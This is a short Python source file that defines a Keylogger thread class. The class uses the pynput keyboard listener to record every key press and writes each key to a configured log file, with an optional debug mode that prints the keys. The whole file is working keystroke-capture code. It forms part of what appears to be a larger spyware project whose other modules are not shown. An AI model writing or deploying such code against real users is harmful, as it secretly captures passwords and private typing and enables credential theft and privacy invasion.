import shutil
from pynput.keyboard import Key, Listener
from datetime import datetime
from threading import Thread
from FileHandler import FileHandler


class Keylogger(Thread):

    def __init__(self, config):
        Thread.__init__(self, name='keylogging')
        self.__config = config



    def onPress(self, key):
        if self.__config.debug:
            print(key, end='')
        FileHandler.fileOut(self.__config.logPath + self.__config.logFileName, key)
            


    def run(self):
        with Listener(on_press=self.onPress) as listener:
            if self.__config.keyloggingIsActive:
                listener.join()
